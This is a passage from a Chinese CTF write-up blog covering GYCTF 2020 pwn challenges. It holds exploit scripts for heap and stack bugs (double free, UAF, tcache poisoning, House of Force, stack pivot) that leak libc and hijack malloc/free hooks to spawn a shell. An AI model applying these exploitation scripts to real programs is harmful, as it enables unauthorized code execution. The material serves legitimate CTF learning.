</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x50</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=mh>0x602060</span><span class=o>-</span><span class=mh>0x8</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>fake</span><span class=p>))</span> <span class=c1># 3 &lt;-&gt; 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span> <span class=c1># 4 &lt;-&gt; 2</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>)</span> <span class=c1># 5 &lt;-&gt; 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span> <span class=c1># 6 &lt;-&gt; fake</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>LibcSearcher</span><span class=p>(</span><span class=s1>&#39;puts&#39;</span><span class=p>,</span> <span class=n>puts</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>puts</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s1>&#39;puts&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>free_hook</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x8</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=c1># 7</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=gyctf-2020>GYCTF 2020</h2><h3 id=borrowstack>borrowstack</h3><p>用 <code>leave_ret</code> 栈迁移到 bss 段，需要注意的是栈从高地址向低地址生长，需要留足够的 <code>offset</code> 确保迁移之后填的 payload 不会覆盖到下面的 got 表。我直接把 payload 长度加起来留了一些余量作为 <code>offset</code>，实际上这里的 <code>offset</code> 甚至可以爆破出来。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>leave_ret</span> <span class=o>=</span> <span class=mh>0x400699</span>
</span></span><span class=line><span class=cl><span class=n>bank</span> <span class=o>=</span> <span class=mh>0x601080</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x400703</span>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mh>0xa0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x60</span><span class=p>,</span><span class=n>bank</span><span class=o>+</span><span class=n>offset</span><span class=p>,</span><span class=n>leave_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;want</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>offset</span><span class=p>,</span><span class=n>bank</span><span class=o>+</span><span class=n>offset</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;now!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>one</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=mh>0x4526a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x60</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span><span class=n>one</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;want</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;now!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=some_thing_exceting>some_thing_exceting</h3><p>每次申请创建三个堆块，其中一个是结构体指针两个是字符串。而释放时没有置 NULL，利用 double free 就可以修改其中一个字符串 chunk 的 fd 指针，指向已经在 bss 段上的 flag。不过对应位置的伪造 <code>size</code> 字段为 <code>0x60</code>，因此为了通过 fastbin 检查需要使用 0x50 的字符串 chunk。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=mh>0x6020a8</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=mh>0x50</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=mh>0x50</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=mh>0x50</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x50</span><span class=p>,</span><span class=mh>0x50</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>flag</span><span class=o>-</span><span class=mh>0x10</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x50</span><span class=p>,</span><span class=mh>0x50</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=some_thing_interesting>some_thing_interesting</h3><p>和上题不同的是没有 flag 在 bss 段了，但是多出了一个检查 code 的选项，该函数内存在格式化字符串漏洞。测出偏移为 17，泄露 libc。</p><p>随后，由于本题的 <code>edit</code> 函数是可以用的，我们不需要 double free 了，直接 uaf 就可以修改 <code>__malloc_hook</code> 为 <code>one_gadget</code> 了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=s1>&#39;OreOOrereOOreO&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=n>code</span><span class=o>+</span><span class=s1>&#39;%17$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x20830</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x23</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x13</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>base</span><span class=o>+</span><span class=mh>0xf1147</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x60</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>两道 something 似乎改编自 ACTF2020 的两道 SCP Foundation。</p></blockquote><h3 id=signin>signin</h3><p>程序分配的块大小固定为 0x70，最多申请 9 个；<code>edit</code> 功能只能用一次，不过并没有检查 chunk 是否是 free 的；<code>delete</code> 检查了 chunk 是否为 free，并且释放之后将 chunk 对应的 <code>flag</code> 标记为 free，因此无法 double free，不过指针依然没有置 NULL。</p><p>此外还存在后门函数，先 <code>calloc(1,0x70)</code>，然后如果全局变量 <code>ptr</code> 不为空就能 getshell。题目环境为 Ubuntu 18，那么思路就是利用 tcache 机制。先填满 tcache，随后对 tcache 中第一个 chunk 投毒，即修改 <code>fd</code> 指向 <code>ptr</code> 上方的 fake chunk，然后申请出一块 tcache chunk，此时 fake chunk 就会进入 tcache 中。再申请一次即可 getshell。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dbg</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x4040c0</span><span class=o>-</span><span class=mh>0x10</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dbg</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;?&#39;</span><span class=p>,</span><span class=s1>&#39;6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dbg</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=force>force</h3><p>程序没有对申请的大小进行检查，结合题目名可以想到 House of Force。先申请一个很大的 chunk 紧挨着 libc，可以泄露出 libc。这里的偏移是通过 gdb 调试得到的，将题目给出的地址和 <code>libc_base</code> 进行 <code>distance</code> 即可。随后修改 top chunk 大小同时泄露堆地址。这样 top chunk 地址也得到了。</p><p>接下来，我使用 <code>pwngdb</code> 工具，调试的时候先查看 <code>heapbase</code>，然后把这个地址作为参数传给 <code>force</code> 命令，即可得到 <code>nb=-48</code>，从而算出 <code>evil_size</code> 为 <code>malloc_hook-top-0x30</code>。申请一个 <code>evil_size</code> 大小的 chunk，然后再申请就能得到 <code>__malloc_hook</code> 附近的 chunk，由于 <code>one_gadget</code> 条件不满足，这里借用了 <code>realloc</code> 去覆盖 <code>__malloc_hook</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>distance</span> <span class=o>=</span> <span class=mh>0x5b2010</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=mh>0x20000</span><span class=p>)</span><span class=o>-</span><span class=n>distance</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0xffffffffffffffff</span><span class=p>))</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;heap&#39;</span><span class=p>,</span><span class=n>heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>top</span> <span class=o>=</span> <span class=n>heap</span><span class=o>+</span><span class=mh>0x20</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc_hook</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>one</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=mh>0x4526a</span>
</span></span><span class=line><span class=cl><span class=n>realloc</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;realloc&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># force heapbase</span>
</span></span><span class=line><span class=cl><span class=n>evil</span> <span class=o>=</span> <span class=n>malloc_hook</span><span class=o>-</span><span class=n>top</span><span class=o>-</span><span class=mh>0x30</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>evil</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span><span class=n>one</span><span class=p>,</span><span class=n>realloc</span><span class=o>+</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;puts</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;size</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>需要注意远程的 chunk 到 libc 偏移量与本地不同，但是不能通过调试得到。此时可以爆破该偏移，又由于 ASLR 不改变低 12 位，只需要步长为 0x1000。</p><h3 id=bf_note>bf_note</h3><p>本题关键在于读取 title 长度时对长度进行了限制，但是后面用的时候依然用的是第一次输入的没有经过限制的长度变量。此外，在读入 description 和 postscript 时存在栈溢出。</p><p>接下来的步骤对我而言属于新姿势，而 <a href=https://b0ldfrev.top/2020/02/24/BFnote/ target=_blank rel="noopener noreffer">原 writeup</a> 写得挺详细了，建议参考。</p><h3 id=document>document</h3><p>本题存在明显的 uaf 漏洞，关键在于通过逆向弄清结构体的结构：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>     -----------------------
</span></span><span class=line><span class=cl>    | prev_size | size=0x21 |
</span></span><span class=line><span class=cl>     -----------------------
</span></span><span class=line><span class=cl>--  | ptr       | sex=1     |
</span></span><span class=line><span class=cl>|    -----------------------
</span></span><span class=line><span class=cl>|   | prev_size | size=0x91 |
</span></span><span class=line><span class=cl>|    -----------------------
</span></span><span class=line><span class=cl>--&gt; | name      | sex=1     |
</span></span><span class=line><span class=cl>     -----------------------
</span></span><span class=line><span class=cl>    |                       |
</span></span><span class=line><span class=cl>    | information           |
</span></span><span class=line><span class=cl>    |                       |
</span></span><span class=line><span class=cl>     -----------------------
</span></span></code></pre></td></tr></table></div></div><p>那么我们利用的思路就很简单了，首先由于 <code>information</code> 所在的 chunk 固定申请 0x80，也就是实际 0x90 大小，我们可以释放掉一块来泄露 libc。然后新申请的 0x20 堆块都会从从释放的这块中切割，这样只需要在 <code>ptr</code> 里写入 <code>free_hook-0x10</code>，那么在编辑 <code>information</code> 时，<code>free_hook</code> 就落在了图中的 <code>information</code> 位置，我们写上 <code>system</code> 即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>()</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>()</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span><span class=o>-</span><span class=mi>88</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>()</span> <span class=c1># 3</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>()</span> <span class=c1># 4</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=n>free_hook</span><span class=o>-</span><span class=mh>0x10</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
